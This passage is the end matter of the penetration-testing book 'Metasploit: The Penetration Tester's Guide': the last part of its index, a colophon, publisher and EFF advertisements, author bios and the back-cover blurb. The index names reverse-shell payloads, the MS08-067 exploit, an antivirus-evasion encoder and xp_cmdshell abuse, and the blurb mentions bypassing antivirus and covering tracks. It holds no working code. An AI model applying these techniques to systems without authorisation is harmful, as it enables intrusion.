148–149, 152</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Weidenhamer, Andrew, 163</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Werth, Thomas, 142</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">White, Scott, 163 white hat test, 4 <span class="s41">whois </span>lookups, 16–17</p><p class="s41" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">WIDEOPENWEST <span class="s42">service provider, 17 Win2k8, 282</span></p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Windows, Task Manager, 117 Windows APIs, manipulating with</p><p class="s42" style="padding-left: 90pt;text-indent: 32pt;text-align: left;">Railgun add-on, 97 Windows authentication, MSSQL</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;line-height: 11pt;text-align: left;">Bruter, 168</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Windows Components Wizard, 269 Windows debug 64KB restriction, 172 Windows Firewall, Windows XP, 269 Windows login credentials, 46 Windows Management Interface</p><p class="s42" style="padding-left: 122pt;text-indent: 0pt;text-align: left;">(WMI), 269</p><p class="s42" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Windows UAC, 248, 249, 283</p><p class="s42" style="padding-top: 3pt;padding-left: 16pt;text-indent: 0pt;text-align: left;">Windows virtual machine, scanning, 21 Windows XP, 76–82</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;line-height: 11pt;text-align: left;">attacking MS SQL, 76–78</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">brute forcing MS SQL server, 78–79 exploitation for, 64–68</p><p class="s41" style="padding-left: 27pt;text-indent: 0pt;line-height: 11pt;text-align: left;">nmap <span class="s42">scan against, 19</span></p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">scanning for ports with <span class="s41">nmap</span>, 76 scanning only one system, 27</p><p class="s42" style="padding-left: 37pt;text-indent: -10pt;text-align: left;">as target machine, 269–274 configuring web server on, 269 creating vulnerable web applica-</p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;text-align: left;">tion, 271–272</p><p class="s42" style="padding-left: 37pt;text-indent: 0pt;text-align: left;">MS SQL server on, 269–271 updating Back|Track, 272–274</p><p class="s42" style="padding-left: 27pt;text-indent: 0pt;text-align: left;">xp_cmdshell, 79–80</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">windows/meterpreter/reverse_tcp</p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;text-align: left;">payload, 246</p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">windows/shell_reverse_tcp <span class="s42">payload, 100</span></p><p class="s41" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">windows/smb/ms08_067_netapi <span class="s42">exploit, 59, 67</span></p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">windows/smb/psexec <span class="s42">module, 84–85 wireless attack vector, 160–161 wireless card, 179</span></p><p class="s42" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">WMI (Windows Management Interface), 269</p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">WScript file, 157</p><p class="s56" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">WSCRIPT HTTP GET MSF Payload <span class="s42">option, SET main menu, 158</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">X</p><p class="s42" style="padding-top: 3pt;padding-left: 48pt;text-indent: -32pt;text-align: left;">X11 servers, vulnerability scanning for, 54–56</p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">x86/shikata_ga_nai <span class="s42">encoder, 13, 103</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">x90<span class="s42">, Intel x86 architecture, 112</span></p><p class="s56" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">xCCs <span class="s42">breakpoints, 208</span></p><p class="s56" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">xp_cmdshell <span class="s42">stored procedure, 79–80, 166, 169, 172, 186, 187, 188,</span></p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;text-align: left;">255, 257</p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">xspy <span class="s42">tool, 55–56</span></p><p class="s42" style="padding-left: 16pt;text-indent: 0pt;line-height: 11pt;text-align: left;">XSS (cross-site scripting)</p><p class="s42" style="padding-left: 48pt;text-indent: 0pt;text-align: left;">vulnerability, 150</p><p class="s41" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">xterm <span class="s42">window, 256</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s55" style="padding-left: 16pt;text-indent: 0pt;text-align: left;">Z</p><p class="s42" style="padding-top: 3pt;padding-left: 16pt;text-indent: 0pt;text-align: left;">Zate, 49</p><p class="s42" style="padding-left: 48pt;text-indent: -32pt;text-align: left;">zero-day vulnerability, Adobe Flash, 110, 146</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s19" style="padding-top: 4pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">Metasploit <span class="p">is set in New Baskerville, TheSansMono Condensed, Futura, and Dogma.</span></p><p style="padding-left: 90pt;text-indent: 18pt;text-align: left;">This book was printed and bound at Malloy Incorporated in Ann Arbor, Michigan. The paper is Glatfelter Spring Forge 60# Antique, which is certified by the Sustainable Forestry Initiative (SFI). The book uses a RepKover binding, which allows it to lie flat when open.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 6pt;text-indent: 0pt;text-align: left;"><span><img width="118" height="80" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_762.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s59" style="padding-left: 24pt;text-indent: 27pt;line-height: 229%;text-align: right;">PRIVACY FREE SPEECH</p><p class="s59" style="padding-top: 16pt;padding-left: 12pt;text-indent: 18pt;line-height: 229%;text-align: right;">INNOVATION FAIR USE TRANSPARENCY INTERNATIONAL</p><p class="s60" style="padding-top: 3pt;padding-left: 4pt;text-indent: 0pt;line-height: 112%;text-align: left;">The Electronic Frontier Foundation <span style=" color: #9D9FA2;">(EFF) is the leading </span><span class="s62">organization defending civil liberties in the digital world. We defend free speech on the Internet, fight illegal surveillance, promote the rights of innovators to develop new digital technologies, and work to ensure that the rights and freedoms we enjoy are enhanced — rather than eroded — as our use of technology grows.</span></p><p class="s63" style="padding-top: 14pt;padding-left: 5pt;text-indent: 0pt;line-height: 106%;text-align: left;">EFF has sued telecom giant AT&amp;T for giving the NSA unfettered access to the private communications of millions of their customers. <span style=" color: #9D9FA2;">eff.org/nsa</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s63" style="padding-left: 5pt;text-indent: 0pt;line-height: 106%;text-align: left;">EFF’s Coders’ Rights Project is defending the rights of programmers and security researchers to publish their findings without fear of legal challenges. <span style=" color: #9D9FA2;">eff.org/freespeech</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s63" style="padding-left: 5pt;text-indent: 0pt;line-height: 106%;text-align: left;">EFF&#39;s Patent Busting Project challenges overbroad patents that threaten technological innovation. <span style=" color: #9D9FA2;">eff.org/patent</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s63" style="padding-left: 5pt;text-indent: 0pt;line-height: 106%;text-align: left;">EFF is fighting prohibitive standards that would take away your right to receive and use over-the-air television broadcasts any way you choose. <span style=" color: #9D9FA2;">eff.org/IP/fairuse</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s63" style="padding-left: 5pt;text-indent: 0pt;line-height: 106%;text-align: left;">EFF has developed the Switzerland Network Testing Tool to give individuals the tools to test for covert traffic filtering. <span style=" color: #9D9FA2;">eff.org/transparency</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s63" style="padding-left: 5pt;text-indent: 0pt;line-height: 106%;text-align: left;">EFF is working to ensure that international treaties do not restrict our free speech, privacy or digital consumer rights. <span style=" color: #9D9FA2;">eff.org/global</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s65" style="padding-left: 5pt;text-indent: 0pt;text-align: left;"><span><img width="74" height="54" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_763.png"/></span>	<span><img width="74" height="54" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_764.png"/></span>	<span><img width="74" height="54" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_765.png"/></span>	<span><img width="22" height="22" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_766.png"/></span>	<span><img width="74" height="54" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_767.png"/></span>	<span><img width="74" height="54" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_768.png"/></span>	<span><img width="74" height="54" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_769.png"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 5pt;text-indent: 0pt;text-align: left;"><span><img width="579" height="93" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_770.png"/></span></p><p style="padding-top: 2pt;padding-left: 20pt;text-indent: 0pt;text-align: left;"><a href="http://www.eff.org/support" style=" color: #231F20; font-family:&quot;Gill Sans MT&quot;, sans-serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 17pt;" target="_blank">EFF is a member-supported organization. Join Now! </a><a href="http://www.eff.org/support" class="s67" target="_blank">www.eff.org/support</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="578" height="107" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_771.png"/></span></p><p class="s68" style="padding-top: 6pt;padding-left: 12pt;text-indent: 0pt;text-align: left;">UPDATES</p><p class="s70" style="padding-top: 7pt;padding-left: 12pt;text-indent: 0pt;text-align: left;"><a href="http://nostarch.com/metasploit.htm" style=" color: black; font-family:&quot;Bookman Old Style&quot;, serif; font-style: normal; font-weight: normal; text-decoration: none; font-size: 12pt;" target="_blank">Visit </a>http://nostarch.com/metasploit.htm <span class="s7">for updates, errata, and more.</span></p><p style="text-indent: 0pt;text-align: left;"/><p style="text-indent: 0pt;text-align: left;"><span><img width="34" height="38" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_772.png"/></span></p><p class="s70" style="padding-top: 10pt;padding-left: 5pt;text-indent: 0pt;text-align: left;">More no-nonsense books from <span class="s71">NO STARCH PRESS</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s71" style="padding-left: 6pt;text-indent: 0pt;text-align: left;"><span><img width="105" height="138" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_773.gif"/></span>	<span><img width="104" height="138" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_774.gif"/></span>	<span><img width="106" height="139" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_775.gif"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s72" style="padding-top: 6pt;padding-left: 5pt;text-indent: 0pt;line-height: 75%;text-align: left;">THE IDA PRO BOOK, 2ND EDITION</p><p class="s71" style="padding-left: 5pt;text-indent: 0pt;line-height: 87%;text-align: left;">The Unofficial Guide to the World&#39;s Most Popular Disassembler</p><p class="s73" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">by <span class="s74">CHRIS EAGLE</span></p><p class="s74" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">JUNE <span class="s57">2011, 672 </span>PP<span class="s57">., $69.95</span></p><p class="s74" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">ISBN <span class="s57">978-1-59327-289-0</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 6pt;text-indent: 0pt;text-align: left;"><span><img width="104" height="138" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_776.gif"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s72" style="padding-left: 5pt;text-indent: 0pt;line-height: 15pt;text-align: left;">HACKING, 2ND EDITION</p><p class="s71" style="padding-left: 5pt;text-indent: 0pt;line-height: 10pt;text-align: left;">The Art of Exploitation</p><p class="s73" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">by <span class="s74">JON ERICKSON</span></p><p class="s74" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">FEBRUARY <span class="s57">2008, 488 </span>PP<span class="s57">. </span>W<span class="s57">/</span>CD<span class="s57">, $49.95</span></p><p class="s74" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">ISBN <span class="s57">978-1-59327-144-2</span></p><p class="s72" style="padding-top: 2pt;padding-left: 10pt;text-indent: 0pt;line-height: 15pt;text-align: left;">GRAY HAT PYTHON</p><p class="s71" style="padding-left: 10pt;text-indent: 0pt;line-height: 87%;text-align: left;">Python Programming for Hackers and Reverse Engineers</p><p class="s73" style="padding-left: 10pt;text-indent: 0pt;line-height: 8pt;text-align: left;">by <span class="s74">JUSTIN SEITZ</span></p><p class="s74" style="padding-left: 10pt;text-indent: 0pt;line-height: 8pt;text-align: left;">APRIL <span class="s57">2009, 216 </span>PP<span class="s57">., $39.95</span></p><p class="s74" style="padding-left: 10pt;text-indent: 0pt;line-height: 8pt;text-align: left;">ISBN <span class="s57">978-1-59327-192-3</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 11pt;text-indent: 0pt;text-align: left;"><span><img width="105" height="138" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_777.gif"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s72" style="padding-left: 10pt;text-indent: 0pt;line-height: 14pt;text-align: left;">PRACTICAL PACKET</p><p class="s72" style="padding-left: 10pt;text-indent: 0pt;line-height: 13pt;text-align: left;">ANALYSIS, 2ND EDITION</p><p class="s71" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Using Wireshark to Solve</p><p class="s71" style="padding-left: 10pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Real-World Network Problems</p><p class="s73" style="padding-left: 10pt;text-indent: 0pt;line-height: 8pt;text-align: left;">by <span class="s74">CHRIS SANDERS</span></p><p class="s74" style="padding-left: 10pt;text-indent: 0pt;line-height: 8pt;text-align: left;">JULY <span class="s57">2011, 280 </span>PP<span class="s57">., $49.95</span></p><p class="s74" style="padding-left: 10pt;text-indent: 0pt;line-height: 8pt;text-align: left;">ISBN <span class="s57">978-1-59327-266-1</span></p><p class="s72" style="padding-top: 2pt;padding-left: 5pt;text-indent: 0pt;line-height: 15pt;text-align: left;">THE TANGLED WEB</p><p class="s71" style="padding-left: 5pt;text-indent: 0pt;line-height: 10pt;text-align: left;">Securing Modern Web Applications</p><p class="s73" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">by <span class="s74">MICHAL ZALEWSKI</span></p><p class="s74" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">SEPTEMBER <span class="s57">2011, 400 </span>PP<span class="s57">., $39.95</span></p><p class="s74" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">ISBN <span class="s57">978-1-59327-388-0</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="padding-left: 6pt;text-indent: 0pt;text-align: left;"><span><img width="104" height="138" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_778.gif"/></span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s72" style="padding-left: 5pt;text-indent: 0pt;line-height: 75%;text-align: left;">THE LINUX PROGRAMMING INTERFACE</p><p class="s71" style="padding-left: 5pt;text-indent: 0pt;line-height: 87%;text-align: left;">A Linux and UNIX<span class="s75">®</span><span class="s76">  </span>System Programming Handbook</p><p class="s73" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">by <span class="s74">MICHAEL KERRISK</span></p><p class="s74" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">OCTOBER <span class="s57">2010, 1552 </span>PP<span class="s57">., $99.95, </span><span class="s73">hardcover</span></p><p class="s74" style="padding-left: 5pt;text-indent: 0pt;line-height: 8pt;text-align: left;">ISBN <span class="s57">978-1-59327-220-3</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><span><img width="382" height="107" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_779.png"/></span></p><p class="s77" style="padding-top: 5pt;padding-left: 161pt;text-indent: 0pt;text-align: left;">PHONE<span class="s78">:</span></p><p class="s9" style="padding-left: 161pt;text-indent: 0pt;text-align: left;">800.420.7240 OR</p><p class="s9" style="padding-left: 161pt;text-indent: 0pt;text-align: left;">415.863.9900</p><p class="s79" style="padding-left: 161pt;text-indent: 0pt;text-align: left;">MONDAY THROUGH FRIDAY<span class="s9">,</span></p><p class="s9" style="padding-left: 161pt;text-indent: 0pt;text-align: left;">9 <span class="s79">A</span>.<span class="s79">M</span>. <span class="s79">TO </span>5 <span class="s79">P</span>.<span class="s79">M</span>. (<span class="s79">PST</span>)</p><p class="s77" style="padding-top: 5pt;padding-left: 48pt;text-indent: 0pt;text-align: left;">EMAIL<span class="s78">:</span></p><p style="padding-left: 48pt;text-indent: 0pt;text-align: left;"><a href="mailto:SALES@NOSTARCH.COM" class="s80" target="_blank">SALES</a><a href="mailto:SALES@NOSTARCH.COM" class="s10" target="_blank">@</a><a href="mailto:SALES@NOSTARCH.COM" class="s80" target="_blank">NOSTARCH</a><a href="mailto:SALES@NOSTARCH.COM" class="s10" target="_blank">.</a><a href="mailto:SALES@NOSTARCH.COM" class="s80" target="_blank">COM</a></p><p class="s77" style="padding-top: 7pt;padding-left: 48pt;text-indent: 0pt;text-align: left;">WEB<span class="s78">:</span></p><p style="padding-top: 1pt;padding-left: 48pt;text-indent: 0pt;text-align: left;"><a href="http://WWW.NOSTARCH.COM/" class="s80" target="_blank">WWW</a><a href="http://WWW.NOSTARCH.COM/" class="s10" target="_blank">.</a><a href="http://WWW.NOSTARCH.COM/" class="s80" target="_blank">NOSTARCH</a><a href="http://WWW.NOSTARCH.COM/" class="s10" target="_blank">.</a><a href="http://WWW.NOSTARCH.COM/" class="s80" target="_blank">COM</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s11" style="padding-top: 15pt;padding-left: 148pt;text-indent: 0pt;text-align: left;">AB OUT THE AUTHO R S</p><p class="s18" style="padding-top: 17pt;padding-left: 90pt;text-indent: 0pt;text-align: left;">David Kennedy <span class="p">is Chief Information Security Officer at Diebold Incorporated and creator of the Social-Engineer Toolkit (SET), Fast-Track, and other open source tools. He is on the Back|Track and Exploit Database development team and is a core member of the Social-Engineer podcast and framework. Kennedy has presented at a number of security conferences including Black Hat, Defcon, ShmooCon, Security B-Sides, and more.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s18" style="padding-left: 90pt;text-indent: 0pt;line-height: 12pt;text-align: left;">Jim O’Gorman <span class="p">is a professional penetration tester with CSC’s StrikeForce,</span></p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">a co-founder of Social-Engineer.org, and an instructor at Offensive-Security. He is involved in digital investigations and malware analysis, and helped build forensic capabilities into Back|Track Linux. When not working on various security issues, Jim spends his time assisting his children in their attempts</p><p style="padding-left: 90pt;text-indent: 0pt;text-align: left;">to fight Zombie hordes.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s18" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Devon Kearns <span class="p">is an instructor at Offensive-Security, a Back|Track Linux developer, and administrator of The Exploit Database. He has contributed a number of Metasploit exploit modules and is the maintainer of the Meta- sploit Unleashed wiki.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s18" style="padding-left: 90pt;text-indent: 0pt;text-align: left;">Mati Aharoni <span class="p">is the creator of the Back|Track Linux distribution and founder of Offensive-Security, the industry leader in security training.</span></p><p style="text-indent: 0pt;text-align: left;"><span><img width="672" height="888" alt="image" src="Metasploit_ The Penetration Tester&#39;s Guide/Image_780.png"/></span></p><h3 style="padding-top: 7pt;padding-left: 34pt;text-indent: 75pt;line-height: 87%;text-align: left;">“The best guide to the Metasploit Framework.” — HD Moore,</h3><h3 style="padding-left: 51pt;text-indent: 0pt;line-height: 41pt;text-align: left;">Founder of the Metasploit Project</h3><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s81" style="padding-top: 4pt;padding-left: 5pt;text-indent: 0pt;text-align: left;">The Metasploit Framework makes discovering, exploiting, and sharing vulnerabilities quick and relatively painless. But while Metasploit is used by security professionals everywhere, the tool can be hard to grasp for first-time users. <i>Metasploit: The Penetration Tester’s Guide </i>fills this gap by teaching you how to harness the Framework and interact with the vibrant community of Metasploit contributors.</p><p class="s81" style="padding-top: 8pt;padding-left: 5pt;text-indent: 0pt;text-align: left;">Once you’ve built your foundation for penetration testing, you’ll learn the Framework’s conventions, interfaces, and module system as you launch simulated attacks. You’ll move on to advanced penetration testing techniques, including network reconnaissance and enumeration, client-side attacks, wireless attacks, and targeted social-engineering attacks.</p><p class="s81" style="padding-top: 7pt;padding-left: 5pt;text-indent: 0pt;text-align: left;">Learn how to:</p><p class="s83" style="padding-top: 7pt;padding-left: 23pt;text-indent: -18pt;text-align: left;"><span class="s84"> </span><span class="s81">Find and exploit unmaintained, misconfigured, and unpatched systems</span></p><p class="s83" style="padding-top: 8pt;padding-left: 23pt;text-indent: -18pt;text-align: left;"><span class="s84"> </span><span class="s81">Perform reconnaissance and find valuable information about your target</span></p><p class="s83" style="padding-top: 4pt;padding-left: 23pt;text-indent: -18pt;text-align: left;"><span class="s84"> </span><span class="s81">Bypass antivirus technologies and circumvent security controls</span></p><p class="s83" style="padding-top: 8pt;padding-left: 23pt;text-indent: -18pt;text-align: left;"><span class="s84"> </span><span class="s81">Integrate Nmap, NeXpose, and Nessus with Metasploit to automate discovery</span></p><p class="s83" style="padding-top: 8pt;padding-left: 23pt;text-indent: -18pt;text-align: left;"><span class="s84"> </span><span class="s81">Use the Meterpreter shell to launch further attacks from inside the network</span></p><p class="s83" style="padding-top: 8pt;padding-left: 23pt;text-indent: -18pt;text-align: left;"><span class="s84"> </span><span class="s81">Harness stand-alone Metasploit utilities, third- party tools, and plug-ins</span></p><p class="s83" style="padding-top: 8pt;padding-left: 23pt;text-indent: -18pt;text-align: left;"><span class="s84"> </span><span class="s81">Learn how to write your own Meterpreter post- exploitation modules and scripts</span></p><p class="s81" style="padding-top: 8pt;padding-left: 5pt;text-indent: 0pt;text-align: left;">You’ll even touch on exploit discovery for zero-day research, write a fuzzer, port existing exploits into the Framework, and learn how to cover your tracks. Whether your goal is to secure your own networks or to put someone else’s to the test, <i>Metasploit: The Penetration Tester’s Guide </i>will take you there and beyond.</p><p style="text-indent: 0pt;text-align: left;"><br/></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s85" style="padding-top: 4pt;padding-left: 45pt;text-indent: 0pt;line-height: 5pt;text-align: left;">THE F I NEST I N GEEK ENTERTAINMENT™</p><p style="padding-left: 45pt;text-indent: 0pt;line-height: 10pt;text-align: left;"><a href="http://www.nostarch.com/" class="s86">www.nostarch.com</a></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s85" style="padding-left: 45pt;text-indent: 0pt;text-align: left;">“I LAY FLAT.” <span class="s87">This book uses RepKover — a durable binding that won’t snap shut.</span></p><p style="text-indent: 0pt;text-align: left;"><br/></p><p class="s88" style="padding-top: 4pt;padding-left: 200pt;text-indent: 0pt;text-align: left;">$49.95 <span class="s89">($57.95 CDN)                        </span>Shelve In: CoMPuTerS/INTerNeT/SeCurITy</p></body></html>
